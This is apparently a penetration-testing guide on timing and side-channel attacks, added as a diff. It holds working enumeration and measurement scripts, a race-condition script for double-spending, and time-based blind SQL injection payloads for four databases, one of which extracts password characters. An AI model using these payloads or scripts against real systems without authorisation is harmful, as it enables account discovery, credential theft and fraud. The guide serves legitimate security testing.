@@ -1,0 +1,315 @@
+<timing_attacks_guide>
+<title>TIMING ATTACKS AND SIDE-CHANNEL ANALYSIS</title>
+
+<critical>Timing attacks exploit measurable differences in processing time to infer sensitive information. These side-channel vulnerabilities can reveal password validity, user enumeration, cryptographic secrets, and hidden functionality. Modern high-resolution timing APIs and network conditions make these attacks increasingly practical against web applications.</critical>
+
+<scope>
+- User enumeration via timing differences
+- Password/credential validation timing
+- Cryptographic key extraction
+- Race condition exploitation
+- Time-based blind injection
+- Resource-based timing inference
+- TOCTOU (Time-of-check to time-of-use) vulnerabilities
+</scope>
+
+<methodology>
+1. Identify operations with potential timing variance (auth, crypto, database lookups).
+2. Establish baseline timing with known-valid vs known-invalid inputs.
+3. Collect sufficient samples to achieve statistical significance.
+4. Apply statistical analysis to detect timing differences.
+5. Correlate timing patterns with sensitive information leakage.
+</methodology>
+
+<attack_categories>
+<user_enumeration>
+{% raw %}
+# Timing differential in login
+# Valid user: Database lookup + password hash comparison
+# Invalid user: Quick rejection or dummy comparison
+
+# Methodology:
+1. Collect timestamps for known-valid usernames
+2. Collect timestamps for known-invalid usernames
+3. Compare mean response times
+4. Statistical significance indicates enumeration
+
+# Measurement approach:
+- Use performance.now() for client-side
+- Use high-precision server timing
+- Account for network jitter with multiple samples
+{% endraw %}
+</user_enumeration>
+
+<password_timing>
+{% raw %}
+# Character-by-character timing attack
+# Non-constant-time string comparison leaks password length/chars
+
+# Attack flow:
+1. Measure response time for password of different lengths
+2. Identify length where timing changes (correct length)
+3. For each position, test characters measuring timing
+4. Longer time = more characters matched before failure
+
+# Target functions:
+- strcmp/memcmp (non-constant time)
+- Early-exit loops
+- Database lookups with partial matching
+{% endraw %}
+</password_timing>
+
+<race_conditions>
+{% raw %}
+# TOCTOU exploitation
+# Time-of-check to time-of-use gaps
+
+# Common patterns:
+1. Check balance → deduct funds (race to spend twice)
+2. Check permissions → access resource (race to escalate)
+3. Validate token → use token (race to reuse)
+
+# Exploitation techniques:
+- Parallel request sending
+- Request timing coordination
+- Connection pool manipulation
+- Turbo Intruder/race condition tools
+{% endraw %}
+</race_conditions>
+
+<crypto_timing>
+{% raw %}
+# Cryptographic timing attacks
+
+# RSA timing (non-constant time modular exponentiation)
+# Measure decryption/signing times for crafted inputs
+
+# HMAC timing (non-constant time comparison)
+# Byte-by-byte tag recovery via comparison timing
+
+# AES cache timing
+# Cache-based side channels in lookup tables
+
+# Token validation
+# Timing differences reveal valid vs invalid signatures
+{% endraw %}
+</crypto_timing>
+</attack_categories>
+
+<measurement_techniques>
+<client_side>
+{% raw %}
+// High-resolution timing in browser
+const start = performance.now();
+await fetch('/api/login', {
+  method: 'POST',
+  body: JSON.stringify({username, password})
+});
+const duration = performance.now() - start;
+
+// Multiple samples for statistical analysis
+async function measureTiming(payload, samples = 100) {
+  const times = [];
+  for (let i = 0; i < samples; i++) {
+    const start = performance.now();
+    await fetch('/api/endpoint', {method: 'POST', body: payload});
+    times.push(performance.now() - start);
+    await sleep(50); // Avoid rate limiting
+  }
+  return {
+    mean: times.reduce((a,b) => a+b) / times.length,
+    stddev: standardDeviation(times),
+    samples: times
+  };
+}
+{% endraw %}
+</client_side>
+
+<server_side>
+{% raw %}
+# Python timing measurement
+import time
+import statistics
+import requests
+
+def measure_response_time(url, data, samples=50):
+    times = []
+    for _ in range(samples):
+        start = time.perf_counter_ns()
+        requests.post(url, json=data)
+        elapsed = time.perf_counter_ns() - start
+        times.append(elapsed)
+    return {
+        'mean': statistics.mean(times),
+        'stdev': statistics.stdev(times),
+        'min': min(times),
+        'max': max(times)
+    }
+
+# Compare valid vs invalid user timing
+valid_timing = measure_response_time(url, {'user': 'admin'})
+invalid_timing = measure_response_time(url, {'user': 'nonexistent'})
+{% endraw %}
+</server_side>
+
+<network_considerations>
+{% raw %}
+# Reducing network noise:
+1. Use TCP keepalive for consistent connections
+2. Send warmup requests to prime caches/connections
+3. Test from same network segment when possible
+4. Use statistical methods robust to outliers
+5. Increase sample size for noisy networks
+6. Consider Server-Timing header if available
+
+# Statistical analysis:
+- T-test for comparing two groups
+- Mann-Whitney U for non-normal distributions
+- Multiple hypothesis correction for many comparisons
+{% endraw %}
+</network_considerations>
+</measurement_techniques>
+
+<exploitation_payloads>
+<blind_sqli_timing>
+{% raw %}
+# MySQL time-based blind
+' AND SLEEP(5)--
+' AND IF(1=1, SLEEP(5), 0)--
+' AND IF(SUBSTRING(password,1,1)='a', SLEEP(2), 0)--
+
+# PostgreSQL
+'; SELECT pg_sleep(5);--
+' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+
+# MSSQL
+'; WAITFOR DELAY '0:0:5';--
+' AND IF 1=1 WAITFOR DELAY '0:0:5'--
+
+# Oracle
+' AND DBMS_LOCK.SLEEP(5)--
+' AND CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) END--
+{% endraw %}
+</blind_sqli_timing>
+
+<race_condition_exploitation>
+{% raw %}
+# Parallel request race (pseudo-code)
+for i in range(100):
+    threads.append(Thread(target=send_request, args=(endpoint,)))
+for t in threads:
+    t.start()  # Start all simultaneously
+
+# Turbo Intruder script pattern
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                          concurrentConnections=30,
+                          requestsPerConnection=100)
+    for i in range(30):
+        engine.queue(target.req, gate='race')
+    engine.openGate('race')
+
+# HTTP/2 single-packet attack
+# Send multiple requests in single TCP packet to minimize timing variance
+{% endraw %}
+</race_condition_exploitation>
+
+<user_enumeration_attack>
+{% raw %}
+# Systematic enumeration with timing
+users_to_test = ['admin', 'root', 'test', 'user1', ...]
+results = {}
+
+for user in users_to_test:
+    timing = measure_response_time('/login', {'user': user, 'pass': 'x'})
+    results[user] = timing['mean']
+
+# Users with significantly different timing likely exist
+baseline = statistics.mean([r for u, r in results.items() if u in known_invalid])
+for user, time in results.items():
+    if abs(time - baseline) > threshold:
+        print(f"Potential valid user: {user}")
+{% endraw %}
+</user_enumeration_attack>
+</exploitation_payloads>
+
+<advanced_techniques>
+<cache_timing>
+{% raw %}
+# Infer cached vs uncached responses
+# Cached responses are typically faster
+
+# Attack flow:
+1. Request resource to populate cache
+2. Have victim access resource (if shared cache)
+3. Measure response time for same resource
+4. Faster = cached = victim accessed the resource
+{% endraw %}
+</cache_timing>
+
+<covert_channels>
+{% raw %}
+# Using timing as data channel
+# Exfiltrate data through response timing
+
+# Server encodes data in delays:
+# 100ms delay = bit 0
+# 200ms delay = bit 1
+
+# Client measures timing to decode data
+{% endraw %}
+</covert_channels>
+
+<amplification>
+{% raw %}
+# Amplify small timing differences
+# Chain multiple operations to increase measurable difference
+
+# Example: Password hash comparison
+# Instead of 1 request, send 1000 parallel requests
+# Aggregate timing differences become measurable
+{% endraw %}
+</amplification>
+</advanced_techniques>
+
+<validation>
+1. Demonstrate statistically significant timing difference (p < 0.05) between conditions.
+2. Show extracted information (valid users, password characters) via timing.
+3. Prove race condition exploitation with successful double-spend or privilege escalation.
+4. Document sample sizes, statistical methods, and confidence intervals.
+5. Provide reproducible measurement scripts and analysis.
+</validation>
+
+<false_positives>
+- Timing differences within network jitter range
+- Insufficient sample size for statistical significance
+- Application uses constant-time comparisons
+- Caching creating artificial timing patterns
+- Rate limiting affecting measurement accuracy
+</false_positives>
+
+<impact>
+- User/account enumeration
+- Credential/password extraction
+- Cryptographic key material leakage
+- Race condition exploitation (double-spending, privilege escalation)
+- Hidden functionality discovery
+- Session/token prediction
+- Authorization bypass via TOCTOU
+</impact>
+
+<pro_tips>
+1. Always collect multiple samples - single requests are noise.
+2. Use statistical tests appropriate for your data distribution.
+3. Warm up connections before measuring to reduce variance.
+4. Test from same geographic region as target for reduced jitter.
+5. Server-Timing header can reveal internal timing if exposed.
+6. Race conditions require parallel request capability - use appropriate tools.
+7. Constant-time comparison libraries prevent password timing attacks.
+8. Cache timing can reveal access patterns and user behavior.
+9. For blind SQL injection, use conditional timing with known-true/false.
+10. HTTP/2 multiplexing enables more precise timing attacks.
+</pro_tips>
+
+<remember>Timing attacks transform microsecond differences into information leakage. Statistical rigor is essential - collect sufficient samples and apply appropriate statistical tests. The most impactful timing attacks target authentication, cryptographic operations, and race-condition-prone state changes.</remember>
+</timing_attacks_guide>
